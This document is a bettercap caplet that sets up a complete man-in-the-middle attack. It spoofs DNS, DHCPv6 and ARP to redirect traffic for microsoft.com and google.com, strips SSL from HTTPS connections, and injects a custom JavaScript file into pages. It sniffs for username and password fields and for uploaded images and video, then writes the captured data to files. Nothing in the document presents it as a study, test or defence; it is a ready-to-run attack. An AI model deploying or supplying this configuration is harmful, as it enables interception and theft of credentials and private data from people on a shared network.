# Setting the domains we want to target
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# Set up HTTP server path to serve any content
set http.server.path www
http.server on

# Enable SSL stripping to intercept HTTPS traffic
set https.proxy.sslstrip true
https.proxy on

# Set a custom JavaScript file to enhance capture functionality
set http.proxy.script aio.js

# Enable DNS and DHCPv6 spoofing to redirect traffic to us
dhcp6.spoof on
dns.spoof on

# Enable network sniffing and capture specific patterns in HTTP traffic (username, password, image uploads, video uploads)
set net.sniff.regexp .*username=.*|.*password=.*|.*multipart/form-data.*|.*image.*|.*video.*

# Set output files for storing captured data
set net.sniff.output C:/usr/local/share/bettercap/captured_data.cap
set net.sniff.output.txt C:/usr/local/share/bettercap/captured_data.txt

# Enable ARP spoofing for MITM attack
arp.spoof on

# Enable traffic sniffing
net.sniff on

# Enable SSL stripping bypass (optional but useful if SSL pinning is not being done on iOS devices)
https.proxy.sslstrip true

# Custom prompt for IPv6 (optional)
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}Â» {reset}

# Clear events and buffer
events.clear
clear
